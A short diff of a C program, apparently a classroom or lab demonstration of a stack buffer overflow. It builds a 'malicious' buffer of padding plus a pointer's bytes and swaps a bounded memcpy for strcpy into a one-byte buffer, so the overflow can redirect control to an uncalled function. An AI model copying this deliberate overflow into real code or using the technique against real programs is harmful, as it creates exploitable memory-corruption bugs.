@@ -12,14 +12,17 @@ int main(void) {
 
     long long v = (long long) p;
 
-    char malicious[9];
+    char malicious[17];
     malicious[0] = 'a';
-    malicious[8] = '\0';
+    malicious[16] = '\0';
 
     for (int i = 0; i < 8; i++) {
         char tmp = v >> (8 * i) & 0xff;
-        malicious[i + 1] = tmp;
+        malicious[i + 9] = tmp;
+        malicious[i + 1] = 'a';
     }
+
+    // printf("%s\n", malicious);
 
     vulnerable(malicious);
 
@@ -28,11 +31,8 @@ int main(void) {
 }
 
 void vulnerable(char * input) {
-    char b[9];
-    memcpy(b, input, 9);
-    for (int i = 0; i < 9; i++) {
-        printf("%x\n", b[i]);
-    }
+    char b[1];
+    strcpy(b, input);
 }
 
 void not_called() {
